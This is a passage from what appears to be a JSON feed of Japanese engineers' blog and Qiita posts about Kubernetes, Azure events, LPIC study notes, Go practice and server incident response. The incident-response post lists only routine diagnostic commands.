LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 使いこなしブックPrometheusでKubernetesを監視する本Kubernetes-Native Development & Deployment実践入門 Kubernetes カスタムコントローラへの道Knativeの歩き方資格情報処理安全確保支援士LPIC 101、102ツール・技術DockerKubernetesHelmPrometheusGrafanaLokiArgo CDConcourseTerraformTelepresencecert-managerWindowsコンテナMicrosoft AzureGo言語Vue.js社内での活動定期勉強会を主催ふりかえりを実施、ファシリテーター役Dockerワークショップを開催2020年の目標2020年もCloud Nativeを突き進む予定です。マストCKA、CKADを取得するコミュニティに貢献するOSSにコントリビュートするGo言語でのプログラミングに慣れる英語力を高めるできれば業務としてKubernetesを扱える環境に身を置く（遠回しな表現）技術書を書く","isoDate":"2020-01-31T19:03:51.000Z","dateMiliSeconds":1580497431000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Windowsコンテナのしくみ","link":"https://speakerdeck.com/kyohmizu/windowskontenafalsesikumi","contentSnippet":"Slides for a study meeting.\\rhttps://dockerjp.connpass.com/event/159781/","isoDate":"2020-01-16T05:00:00.000Z","dateMiliSeconds":1579150800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"テストで使いたくて，DinD (Docker in Docker) でk8sの環境を整えた","link":"https://qiita.com/tozastation/items/eafde1a75c35bb9d1a68","contentSnippet":"TL;DRこちらのDockerfileを見納めくださいkindとアプリケーションのコンテナを分けても良かったのですが，kubeconfigの受け渡しが面倒だったので妥協しましたhttps://github.com/tozastation/kw/blob/maste...","isoDate":"2019-12-30T14:30:36.000Z","dateMiliSeconds":1577716236000,"authorName":"tozastation","authorId":"tozastation"},{"title":"0からはじめる Windows on Kubernetes","link":"https://qiita.com/kyohmizu/items/dffdd49123b1e47c3ac4","contentSnippet":"はじめにKubernetes の Windows 対応は v.1.14 でGAとなりました。本記事では、既存の Kubernetes クラスタに0から Windows ワーカーノードを追加する方法をご紹介します。実行環境今回は実行環境として Azure を使用し...","isoDate":"2019-12-22T18:19:52.000Z","dateMiliSeconds":1577038792000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Knative Serving in Production","link":"https://qiita.com/toVersus/items/1317a31fead9b836a68d","contentSnippet":"概要Knative Serving は、ステートレスなアプリケーションを対象に、HTTP リクエスト駆動で自動スケールする仕組みを提供します。Kubernetes (K8s) と Ingress (Istio or Gloo, Ambassader) を程よく抽象化し、...","isoDate":"2019-12-18T22:00:21.000Z","dateMiliSeconds":1576706421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"キャリアアップ支援制度を利用してArchitecting on AWSを受講しましたというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2019/12/15/004259","contentSnippet":"tech.mobilefactory.jpだいぶ前に受けたArchitecting on AWSの聴講記録です。","isoDate":"2019-12-14T15:42:59.000Z","dateMiliSeconds":1576338179000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GDG DevFest Tokyo 2019に行ってきた","link":"https://blog.masasuzu.net/entry/2019/12/14/000000","contentSnippet":"tokyo.gdgjapan.org珍しく、何も予定が入ってない土曜日だったので、行ってきました。最近GCPを触る機運が出てきたのでちょうどいいタイミングでした。以下メモGCP 101 | 坂田 純 | GDG DevFest Tokyo 2019主にCloudRunの話。HTTPをlistenするコンテナを起動するサービス。使った分だけ課金対象となる。リクエスト数次第で自動的にスケールする。とお手軽にできそうな印象。インターフェースがHTTPなので基本的にはパブリックでアクセス出来てしまうが、--no-allow-unauthticatedオプションをつけてデプロイするとで限られた人だけ実行できるようになります。これでバッチ的なことができそう?マイクロサービスの開発とテストファースト/テスト駆動開発 | 柴田 芳樹 | GDG DevFest Tokyo 2019ちょいちょいブログとかは見てましたが、話を聞くのは初めてでした。還暦を迎えてもコードをバリバリ書いてるのは素直に尊敬します。メルペイのマイクロサービスのテストにも興味深かったですが、組み込みでのテストの話も興味深く聴かせてもらいました。ツールや環境の充実度の差はあれど、組み込みでもウェブでもやるべきことは同じなのだなと思いました。CloudNative 時代における GKE/Kubernetes ではじめる開発 | 青山 真也 | GDG DevFest Tokyo 2019k8sの紹介的な話。k8s好きになりました。話がすごいうまくて、めんどくさそうだなあと思ってたkubernetesの印象が変わりました。その他:D社のブースを覗いたらMOVの構成図が展示されていて、IoT関連だけAWSを使っていてそれ以外はGCPを使ってるのが興味深かった。IoT関連のものも別で実装して、AWSからは引き上げるようなことを言ってて、なるほどなあとなりました。基本的にAWSで構成されたインフラばかり見てたのでなかなか新鮮でした。","isoDate":"2019-12-13T15:00:00.000Z","dateMiliSeconds":1576249200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"【イベント参加レポート】Microsoft Ignite The Tour Tokyo","link":"https://kyohmizu.hatenablog.com/entry/2019/12/10/012041","contentSnippet":"2019/12/5(木)、6(金)に開催された Microsoft の Tech イベントに参加しました。www.microsoft.com概要アメリカで行われた Ignite のセッションを再演登壇者は他人の資料で発表 (翻訳以上の改変はできないと聞きました)新情報の発表等はされず、通常セッションとハンズオンのみMicrosoft エキスパートとの交流の場外国人のスタッフを多数配置基本的には英語でやり取りするらしい (私は話しませんでした)感想外国人が多く、グローバルな印象を受けました。会場はいつものホテルでしたが、やはりセッションの入れ替え時は非常に混雑します。ブースのエリアはスペースを広くとってあり、割と閑散としていた気がします (セッション中は特に)。技術的には初級者向けの内容が多かったと思います。セッションよりは、どちらかといえばコミュニケーションを重視したイベントのようでした。MSの方やブースの担当者と話すことができ、有意義な時間を過ごせました。参加して得るものはありました。セッション参加セッションのまとめとメモ。THR30031 - Azure とコマンドライン－オプション、ヒント、テクニック難易度：初級メモエクスプローラーでcmdをパスに入力(powershell、wslも)Windows Console → Windows TerminalTerminalはStoreで入手可能Azure CLIやVSCode RemoteはサラッとAPPS30 - コンテナーを利用したアプリケーションの最新化資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps30難易度：初級要点コンテナ、Dockerの基礎的な説明コンテナランタイムやマルチステージビルド等は、軽く話に出る程度コンテナに関しては特に知らない話はなかったACRやACIの概要、使い方の軽い説明サービス移行のデモではコンテナ化してApp Service、CosmosDB、SQL Databaseを使用メモデータセンターのアプリをクラウドにLift&Shift仮想マシンはいいけど無駄が多いコンテナを使ったモダナイゼーションアプリの境界を明確にする旧バージョンの残りファイルがなくなるオーバーヘッドなしでリソース分離繰り返し可能なビルド、環境構築コンテナを使う理由あらゆる環境で同じように動作するベロシティの向上コンテナの仕組み高度に構成されたプロセスcgroupsnamespaceベースイメージからの差分をgzip化したものコンテナランタイムの軽い説明Docker以外にも対応、containerd、runCDockerfileイメージのビルド方法を説明するテキストファイルバッチスクリプトみたいなものビルドリポジトリACRACIサーバーレスのコンテナ実行環境ハイパーバイザーレベルの分離デモサービス移行の話APPS40 - インフラストラクチャと Azure Kubernetes Service を統合する資料：https://github.com/microsoft/ignite-learning-paths-training-apps/tree/master/apps40難易度：中級要点AKSの作成手順の説明AKSとAzureの連携サービスについて知識を整理できたオートスケールの話は理解が浅かったので参考になったAKSを使う最大のメリットはAzureADとの連携ネットワークとセキュリティの話は非常に参考になったネットワークポリシーやAZメモ基本的な使い方ではなく、発展的な内容Tailwind Tradaersのデモ経営、ビジネス課題に対応復元力セキュリティ柔軟性スケールKubernetesを選択する理由抽象化のための標準化されたAPI自己修復スケーラビリティk8sアーキテクチャAKSはマスターノードが無料で提供されるネットワークに2種類指定できるデフォルトはkubenetAzure CNI 仮想ネットワークを使用。大規模ネットワークに対応。きちんと設計する必要があるACIを仮想ノードとして使用AZAKSの作成リソースグループ仮想ネットワークサブネットサービスプリンシパル(k8sから他のリソースを作成)クラスタ本番クラスタを作成するにはオプションを多数指定する必要がある作成時にしか設定できないオプションがあるインストール時にCNI、AZの設定をする仮想ノードの有効化ACIをAKSから使えるようにする必要があるRabbitMQ is 何？HPAメトリクスサーバーにPodから情報が送られる閾値を超えたらスケールクラスタオートスケーラーノードのスケール仮想ノードLinux、Windows、GPUに対応nodeselectorで指定仮想ノードによるスケールのデモネットワークとセキュリティACRでコンテナの脆弱性をチェックAKSを使う最大のメリットはAzureADとの連携！Azure Key VaultPod間の通信Pod IdentityNMI Server(Daemonset)MICAzure Identity BindingネットワークポリシーPod間トラフィックの保護Azure Network PolicyAzure CNIを使ったPodブリッジレベルCalico Network PolicyカーネルレベルAZベータ版データセンター障害の回復性ゾーンは3つまで使用可能ゾーンの数に合わせてレプリカ数を設定THR10007 - ITと技術者の将来について語り合うエモい話要点ディスカッション形式コミュニティ参加やアウトプットを重視しているどんどんチャレンジしてスキルをつけていくことが大事メモ今後あるいは10年後どうなる？これからチャレンジしたいことは？MRフリーランス自分の営業をこれからも続けていく自分が何が得意で、何が苦手かアピールブルーオーシャンを探したいコミュニティのエンパワーメント出てこない人にどうやって技術を好きになってもらうか社内コミュニティを作ってもらうお勧めしたいことは？技術を楽しんで、周りに広めていく仲間ができてコミュニティができる人を変えるのは難しい、好きなことを広めることならできる楽しんでる雰囲気を出していると向こうから来てくれる自分の強みを知って、それを発信していく業務で触ってなくてもコミュニティで発表いていたやりたいこと、好きなことを見つけて、人が見える場所に出していく外のコミュニティに参加してみる会社にいるだけではスキルはプロジェクト依存コミュニティの熱量がすごいアウトプットすると強い人がインプットをくれるとりあえず踏み出してみる楽しんだもの勝ちやりたいことを素直にやってみるUNC10013 - Vue.js 3 に向けた Vue.js 入門難易度：初級～中級要点Vue.js の設計思想、V3 でも使える構文、V3 の新機能コンポジッションAPI関数ベースで提供される APIコンポーネントのロジックが綺麗になるV2 でもお試しで使えるブース立ち寄ったブースの中で、興味を持った内容を紹介します。LenovoLenovo ThinkSystem SE350 | レノボジャパン軽量でコンパクトなエッジサーバーWifi、LTE、有線ネットワーク対応Intel製品概要: OpenVINO™ ツールキットエッジでのディープラーニング推論アプリケーション開発学習済みモデルを無料で利用可能インテルCPUに対応PivotalAzure Spring Cloud | Microsoft DocsSpring Boot アプリをクラウドで実行ベータ版のサービスAKS 上にデプロイされる水平スケールやメトリクス、ログの収集が可能AKS は隠蔽されているため、ユーザーからは見えない手軽に導入できるので POC にも適している","isoDate":"2019-12-09T16:20:41.000Z","dateMiliSeconds":1575908441000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Zero Scale Abstraction in Knative Serving - Part1","link":"https://qiita.com/toVersus/items/9fa635e9cf57643f8dd6","contentSnippet":"Serverless Days Tokyo 2019 の Zero Scale Abstraction in Knative Serving というセッションの内容を書き起こしたものです。スピーカーノートをベースに、セッションの時間内で話せなかった内容も含めて、Knativ...","isoDate":"2019-10-23T13:20:58.000Z","dateMiliSeconds":1571836858000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"LPIC 102 チートシート","link":"https://qiita.com/kyohmizu/items/d5d6fedc527efa9f649c","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentDISPLAYリモートアクセス先のホストLANGロケール(全カテゴリ)TZタイムゾーンUSERログインユーザーHOSTNAMEホスト名PAT...","isoDate":"2019-10-09T01:56:54.000Z","dateMiliSeconds":1570586214000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"LPIC 101チートシート","link":"https://qiita.com/kyohmizu/items/923844999018fd456d44","contentSnippet":"試験前の確認事項としてまとめた内容です。環境変数namecontentPATHコマンドのパスEDITORデフォルトのエディタHISTFILE履歴ファイルのパスHISTFILESIZE履歴ファイルの保存履歴数LD_LIB...","isoDate":"2019-10-09T01:48:33.000Z","dateMiliSeconds":1570585713000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"面倒なことはScalaスクリプトにやらせよう / let scala scripts do the troublesome things","link":"https://speakerdeck.com/nomadblacky/let-scala-scripts-do-the-troublesome-things","contentSnippet":"2019/09/13 Scala秋祭り","isoDate":"2019-09-16T04:00:00.000Z","dateMiliSeconds":1568606400000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"de:code 2019 参加レポート","link":"https://kyohmizu.hatenablog.com/entry/2019/06/06/111805","contentSnippet":"Microsoft主催のテクニカルカンファレンス「de:code 2019」に参加してきました。www.microsoft.com参加セッション1日目コンテナ技術を中心にセッションを選択【KN01】基調講演【CD06】しくみがわかる Azure Kubernetes Service (AKS) ～開発者目線で Kubernetes の基本を理解する～【CD01】Windows Containers と Azure による、既存 .NET アプリケーションのモダナイゼーション【CD91】HashiCorp Terraform Azure Provider チュートリアル【CD12】マネージド Kubernetes ガチ本番運用 in ZOZOTOWNwww.youtube.com2日目コンテナ・セキュリティのセッションを選択【SE07】脆弱性はなぜ生まれ、どのように攻撃されるのか? 安全なアプリを開発、運用するためのきほん【CD93】コンテナ環境の永続化ストレージ問題を NetApp Kubernetes Service と Azure NetApp Files でさらっと解決【CM12】.NET Core マルチ プラットフォームの本質【SE05】もうセキュリティはやりたくない!! 第 3 弾 ～Azure Sentinel Deep Dive～注目技術参加したセッションの中で、特に印象に残った or 関心のある技術を取り上げます。Azure Kubernetes Service(AKS)Azureのマネージド Kubernetes サービスである AKS ですが、導入事例が増えてきているそうです。ノロジーズをはじめ、いくつかの企業が自社の導入について講演していました。Kubernetes に概要や操作に関しては特筆することはありませんでしたが、Azure関連の技術として以下に興味を持ちました。Kubernetes-based Event-driven Autoscaling(KEDA)Microsoft と Red Hatが共同作成したプロジェクト。イベント駆動でコンテナのオートスケールを実現します。GitHub - kedacore/keda: KEDA is a Kubernetes-based Event Driven Autoscaling component. It provides event driven scale for any container running in KubernetesVirtual Kubeletkubelet のように動作し、Kubernetes と他のAPIを接続する役割を果たすもの。VM と同じように Kubernetes クラスタで一元管理できます。GitHub - virtual-kubelet/virtual-kubelet: Virtual Kubelet is an open source Kubernetes kubelet implementation.Windows コンテナサポートWindows Server Node が、Kubernetes クラスタで Linux Node と同時に管理できるようになりました。AKS では Multiple Node Pool を使用することで Windows Server Node を作成できます。チュートリアルを試しましたが、なぜかクラスタ作成に失敗)Windows containers now supported in Kubernetes - Open Source blogAzure NetApp FilesNetApp 社の高速ストレージサービス。SSD 並みの速度が出るそうで、Kubernetes の永続化ボリュームとして有用だと思います。また NetApp Kubernetes Service という Kubernetes 管理サービスも提供しているようです。(Rancher みたいなもの？)Azure NetApp Files documentation | Microsoft DocsAzure SentinelAI を使用した高機能なセキュリティサービス。Azure Sentinel | Microsoft Azureその他Azure DevOpsAzure PiplineApp ServiceService FabricWSL2感想Azureに関連したテーマのセッションがほとんどでした。クラウドサービスは以前に比べ使いやすくなっていて、機能も充実してきた印象です。AKS、AzureADの動向は今後も注目していこうと思います。LT資料社内勉強会で de:code の recap を発表しました。    Recap of de code 2019  from Kyohei Mizumoto www.slideshare.netおまけ2日間のお昼のお弁当です。1日目2日目","isoDate":"2019-06-06T02:18:05.000Z","dateMiliSeconds":1559787485000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetesリンク集","link":"https://kyohmizu.hatenablog.com/entry/2019/05/28/115504","contentSnippet":"Kubernetes関連の役立つリンクを記載します。公式リファレンスReference - KubernetesKubectl Reference DocsPhippy and Friends - Cloud Native Computing FoundationGitHubGitHub - kubernetes/kubernetes: Production-Grade Container Scheduling and ManagementGitHub - kelseyhightower/kubernetes-the-hard-way: Bootstrap Kubernetes the hard way on Google Cloud Platform. No scripts.GitHub - jamiehannaford/what-happens-when-k8s: \uD83E\uDD14 What happens when I type kubectl run?プロダクトGoogle Kubernetes Engine documentation \xa0|\xa0 Kubernetes Engine \xa0|\xa0 Google CloudAzure Kubernetes Service (AKS) Documentation - Tutorials, API Reference | Microsoft DocsWhat Is Amazon EKS? - Amazon EKSDocumentation | Rancher LabsK3s: Kightweight KubernetesPivotal Container Service (PKS) | Pivotalスライド、ブログ等Kubernetes のソースコードとの付き合い方 #gounco / Kubernetes source code reading - Speaker DeckKubernetes Patterns : Capacity PlanningKubeWeekly - QiitaKubernetesのユーザー管理と認証・権限確認機構を理解しよう | さくらのナレッジ書籍Kubernetes完全ガイド - インプレスブックス","isoDate":"2019-05-28T02:55:04.000Z","dateMiliSeconds":1559012104000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【20日チャレンジ】LinuxコマンドをGoで実装","link":"https://kyohmizu.hatenablog.com/entry/2019/05/23/172119","contentSnippet":"Go言語の学習のため、LinuxコマンドをGoで実装します。\\r目的\\r\\rGo言語に慣れる\\r標準パッケージの機能、使い方を知る\\r\\rルール\\r以下のルールでチャレンジを行います。\\r\\r1日1コマンドを実装する\\r最低限、コマンドの基本的な動作(オプションなしの実行など)を行えるようにする\\r余裕があれば追加機能を実装する\\rコマンド名は\\"my\\" + \\"Linuxコマンド名\\"とする\\r極力標準パッケージを使用する\\r\\rソースコード\\rソースコードはGithubで管理します。\\rhttps://github.com/kyohmizu/go-cli-tools\\rスケジュール\\r\\r\\r\\rNo\\r日付\\rコマンド\\r基本実装\\rオプション\\r学習内容\\r\\r\\r1\\r5/23\\rmyls\\r〇\\r\xa0\\r\\rディレクトリ操作\\rエラー処理\xa0\\r\\r\\r\\r2\\r5/24\\rmycp\\r〇\\r△\\rファイル操作\\r\\r\\r3\\r5/25\\rmymv\\r〇\\r△\\r\xa0\\r\\r\\r4\\r5/26\\rmyrm\\r〇\\r△\\r\xa0\\r\\r\\r5\\r5/27\\rmycat\\r〇\\r△\\r\xa0\\r\\r\\r6\\r5/28\\rmycurl\\r〇\\r△\\r\\rhttp接続の実装\\rオプションの複数回指定\\r\\r\\r\\r7\\r5/29\\rmypwd\\r〇\\r△\\r\xa0OSによる条件分岐\\r\\r\\r8\\r5/30\\rmytouch\\r〇\\r△\\rbuild tagの設定\xa0\\r\\r\\r9\\r5/31\\rmymkdir\\r〇\\r△\\r\xa0ファイルの操作権限\\r\\r\\r10\\r6/1\\rmykill\\r〇\\r〇\\rプロセスとシグナル\xa0\\r\\r\\r11\\r6/2\\rmyecho\\r〇\\r-\\r引数の取得\\r\\r\\r12\\r6/3\\rmytime\\r△\\r-\\r\\rコマンド実行\\rtimeの操作\\r\\r\\r\\r13\\r6/4\\rmychmod\\r△\\r-\\r\\rbit演算\\rファイルの権限\\r\\r\\r\\r14\\r6/5\\rmyyes\\r〇\\r〇\\r\xa0\\r\\r\\r15\\r6/6\\rmyenv\\r〇\\r△\\r\\rwindowsで確認不可\\r\\r\\r\\r16\\r6/7\\rmychown\\r〇\\r△\\r\\ruser,group操作\\rwindowsで確認不可\\r\\r\\r\\r17\\r6/8\\rmygrep\\r〇\\r△\\r\\rgrepの操作\\rgoの正規表現\\r\\r\\r\\r18\\r6/9\\rmysleep\\r〇\\r△\\r\xa0\\r\\r\\r19\\r6/10\\rmymkdir\\r〇\\r△\\r\xa0\\r\\r\\r20\\r6/11\\rmyln\\r〇\\r△\\rリンクの操作\\r\\r\\r\\r\xa0\\r成果\\r\\rGoの構文や記法に慣れてきた\\rGo標準パッケージの使い方、調べ方を覚えた\\rLinuxコマンドの動作を知ることができた\xa0\\r\\r感想\\r20日も書けば、ある程度書けるようになることがわかりました。\\r普段使用するC#とGoが似ている点も覚えやすかったのだと思います。\\r次はGoでAPIを作成してみようと考えています。","isoDate":"2019-05-23T08:21:19.000Z","dateMiliSeconds":1558599679000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Istioが作るサービスメッシュ~サンプルアプリのデプロイ~","link":"https://qiita.com/tozastation/items/1f3c3f213b42e1689406","contentSnippet":"サンプルアプリ題材: BookInfo アプリケーション※ 事前にIstioをKubernetesにデプロイしておいてください．構成サンプルアプリのデプロイistio-1.0.6 directorykubectl apply -f samples/boo...","isoDate":"2019-03-14T05:18:21.000Z","dateMiliSeconds":1552540701000,"authorName":"tozastation","authorId":"tozastation"},{"title":"2018年振り返りと、2019年の目標","link":"https://kyohmizu.hatenablog.com/entry/2018/12/31/231740","contentSnippet":"2018年5月末から、エンジニアリングに関する様々な活動を行ってきました。\\r1年の終わりにそれらの活動をまとめ、2019年の目標を記したいと思います。\\r\\r2018年の活動\\r2018年は積極的に新しい技術へチャレンジし、勉強会を通して素晴らしい方々に出会うことができました。\\r新たに触れた技術・ツール\\r\\rGitHub\\rNode.js\\rAngular\\rGolang\\rCentOS\\rDocker\\rKubernetes\\rAzure\\rGCP\\rOWASP ZAP\\rLINE BOT/Clova\\rAgile\\rペアプログラミング/モブプログラミング\\r\\r勉強会・カンファレンス\\r\\rLINE Developer Meetup\\rde:code 2018\\rAzureもくもく会\\rng-japan 2018\\rSQL Server 2017勉強会\\rInteract 2018\\rCCSE 2018\\rThink Japan IBM Code Day\\rJXUG Xamarinハンズオン\\rCosmos DBハンズオン\\rくじらや Dockerハンズオン\\rLINE Clovaスキル開発ハンズオン\\rLINE BOOT AWARDS 2018 ハッカソン\\rGDG DevFest Tokyo 2018\\rXP祭り\\rAzureML勉強会\\rBIT VALLEY 2018\\r.NET Conf 2018\\rContainer SIG Meet-up\\rテスト管理を語る夕べ\\rAVTOKYO\\rアジャイル相談室\\rOSSセキュリティ技術の会\\rJapan Container Days\\r\\r※Japan Container Daysはスタッフとして参加させてもらいました。\\r書籍\\r読了\\r\\r徹底攻略 データベーススペシャリスト教科書\\r徹底攻略 ネットワークスペシャリスト教科書\\rショートコードプログラミング 第3版\\r新装版 達人プログラマー\\rSQLアンチパターン\\rインフラエンジニアの教科書2\\rプログラマのためのDocker教科書 第2版\\rDocker/Kubernetes 実践コンテナ開発入門\\r\\r読みかけ\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\r\\r社内の活動\\r\\r技術交流、コミュニケーション促進のためチャンネルを開設\\r社内勉強会を主催\\rモブプログラミング・ペアプログラミングを開始\\r\\r資格\\r合格\\r\\rデータベーススペシャリスト\\r\\r不合格\\r\\rネットワークスペシャリスト\\r\\r午後Ⅰが1点足りず…\\rその他\\r\\rはてなブログを開設\\rQiitaアドベントカレンダーに参加\\r\\r2019年の目標\\r7ヶ月間の活動の中で、様々な技術分野にチャレンジした結果、インフラ・セキュリティへの関心が強いことがわかりました。\\r2019年はContainerを中心にインフラのスキルを身に着け、セキュリティ分野の知見を広めていきます。\\r書籍\\r\\r体系的に学ぶ 安全なWebアプリケーションの作り方 第2版\\rKubernetes完全ガイド\\rハッカーの学校\\rテスト駆動開発\\r徹底マスター JavaScriptの教科書\\rドメイン駆動設計\\rハッキング・ラボのつくりかた\\r\\r資格\\r\\rLPIC Level1\\r情報処理安全確保支援士\\rネットワークスペシャリスト","isoDate":"2018-12-31T14:17:40.000Z","dateMiliSeconds":1546265860000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"モバイルファクトリーのインフラアーキテクチャというアドベントカレンダー書いてました","link":"https://blog.masasuzu.net/entry/2018/12/22/000000","contentSnippet":"ちょっと過去の話ですが、会社の技術ブログで書いてました。tech.mobilefactory.jp","isoDate":"2018-12-21T15:00:00.000Z","dateMiliSeconds":1545404400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"kubernetesにあるIngress Controller�の一覧を挙げてみる","link":"https://qiita.com/skikkh/items/c59de1f5e188d0bbeb35","contentSnippet":"はじめにIngress ControllerはL7 Load Balancerの機能を果たすものであり、Ingressリソースはそのルールを定義したものです。このIngress Controllerを実際に実装したものは数多作られており、環境によって、大なり小なり記述方...","isoDate":"2018-12-17T14:21:33.000Z","dateMiliSeconds":1545056493000,"authorName":"skikkh","authorId":"skikkh"},{"title":"日本語でvimのfを使う","link":"https://qiita.com/atsuya0/items/d90bb3f4b8e538c028a9","contentSnippet":"fvimではf, F, t, Tを使うことで、瞬時に目的の文字上にカーソルを移動することができます。動作faでカーソルから右側の方向の１番近い「a」の位置に移動することができます。3faでカーソルから右側の方向の３番目に近い「a」の位置に移動することができます。...","isoDate":"2018-12-04T06:03:39.000Z","dateMiliSeconds":1543903419000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[Docker] awslogs-datetime-format の指定方法に注意","link":"https://qiita.com/toshikish/items/59a3a4426930e29f0673","contentSnippet":"[Docker] awslogs-datetime-format の指定方法に注意背景Dockerの awslogs ログドライバでは，awslogs-datetime-format オプションがあり，指定した形式の日時がログのある行に含まれていれば，続く行も同じ...","isoDate":"2018-11-07T03:23:50.000Z","dateMiliSeconds":1541561030000,"authorName":"toshikish","authorId":"toshikish"},{"title":"ローカル環境でAnsibleの鍵交換がめんどくさい貴方に送るプラクティス","link":"https://qiita.com/skikkh/items/ca236c512d314691b35c","contentSnippet":"はじめに平成の時分も終わりに近づく中、野分立ち尽くす天災に人々は翻弄され、お家で過ごすのを余儀なくされる日が多いように思います。1今日のような一日は、自然とQiitaにたどり着き、PVが増えるのではないかと勝手に邪推する筆者です。さて、話は閑話休題。ローカル環...","isoDate":"2018-09-30T09:33:37.000Z","dateMiliSeconds":1538300017000,"authorName":"skikkh","authorId":"skikkh"},{"title":"新人が学ぶAnsibleもくもく会 ネットワーク編 報告会","link":"https://qiita.com/skikkh/items/156c677e07ffc6b5b4ef","contentSnippet":"はじめにお久しぶりのエントリになります。新卒でインフラエンジニアをしている小心者のひよこです。このような職種に身をおいてはや5ヶ月というところで、世の中を幅広く見渡してみると、どうやら世は大クラウド時代を嚆矢として、様々なレイヤーでの自動化、Kubenetesに...","isoDate":"2018-08-29T14:34:09.000Z","dateMiliSeconds":1535553249000,"authorName":"skikkh","authorId":"skikkh"},{"title":"[Laravel] バリデーションデータに前処理したい","link":"https://qiita.com/toshikish/items/f38b691adbebd7ba7720","contentSnippet":"[Laravel] バリデーションデータに前処理したい当てはまるケースフォーム入力データとデータベース保存データの形式が違う．例えば…全角・半角変換先頭・末尾の空白を取り除くユーザーには090で始まる形式の携帯電話番号を入力してもらっているが，システム的に...","isoDate":"2018-06-12T09:27:45.000Z","dateMiliSeconds":1528795665000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Git リポジトリを分割する","link":"https://qiita.com/toshikish/items/3529f75c511a65723798","contentSnippet":"以下のようなディレクトリ構造のリポジトリを分割する方法を場合分けしてまとめます。repo1/ ├─ subdir/ ├─ aaa ├─ bbb ├─ ccc └─ dddケース1：サブディレクトリを切り出すリポジトリ repo1 のサブディレクトリ su...","isoDate":"2018-04-11T10:14:22.000Z","dateMiliSeconds":1523441662000,"authorName":"toshikish","authorId":"toshikish"},{"title":"障碍対応と私","link":"https://blog.masasuzu.net/entry/2015/12/18/troubleshooting","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid drawableは画像を入れておくだけじゃないでした。今日は障碍の話です。普段障碍対応しているときにやってること考えてることをざっくりと時系列を追って書いていきたいと思います。コンテキストとしてはLinuxサーバでwebサービスをやっていると思っていただければと思います。障碍の検知webサービスを運営していれば、何かしらの監視システムからSlackなりIRCなりメールなり電話なりでアラートの通知が来ると思います。対応報告障碍対応をしている旨をメールなり、何かの連絡手段で伝えます。同じく見ている人がいれば調査作業の分担もできます。状況把握どこで障碍?アラートの通知内容にどのサーバで何が起きた的なことが書いてあるはずなので、それを確認します。だいたいの組織に於いてはサーバ管理表的なものがwebなりExcelなり設定ファイルなりにあるはずなので、そこと照らし合わせてどのプロジェクトのどのロールなのかを把握します。直前に何をした? いつもと違うことは何?webアプリケーションであれば直前に入れた変更が原因かもしれません。また、ちょっと前に入れていた変更だが、cronで時限発火したというケースも考えられるかも知れません。イベント開始で急にトラフィックが上がったと言うことも考えられるかも知れません。普段と変わったことは何かということが把握出来れば対処の幅が広がります。影響範囲は?サービス全体なのか、サービスの1機能の障碍なのか、ミドルウェア障碍なのか、影響がどの範囲に及んでいるのかを見ます。ミドルウェア障碍であれば、最近であれば、冗長化されてるのが普通なので、サービスから切り離して、監視から外せば終わりというパターンも多いです。サービス全体が落ちている場合は、ひとまず重要な関係者に状況の1次連絡すぐにした方が良いでしょう。接続出来る?そもそも、該当サーバに接続出来ない場合は、できることはほぼないので、該当サーバをサービスから外した上で、監視対象から外します。(単体のサーバ障碍の場合)# pingは通る?ping ${IP}# sshできる?ssh ${IP}ログの確認該当サーバ上で動いているミドルウェアやアプリケーションサーバのエラーログを主に見ます。だいたいこの辺に重要な情報が出力されている可能性があります。システムのログも確認した方が良いです。主にsyslogやkernelログを見ると良いでしょう。# syslogを見るless /var/log/syslog# kernelログを見るless /var/log/kern.log# kernelログを見る2dmesgサーバ状態の確認負荷の関係で障碍が起きているのであれば、現在のサーバの状態を確認しましょう。以下のようなコマンドが現状把握に役立つでしょう。# loadaverageおよびログイン中のユーザを見るw# 変なプロセス無いか見るps -ef# orps auxwwww# 開いているポートを確認するnetstat -tlnp# ネットワークコネクションを確認するnetstat -taopen# なにかCPU使いまくってないか見るtop# 現在の負荷の経過を見るdstat -tamsl 5# 過去の負荷情報を見る## CPUsar## memorysar -r## lasar 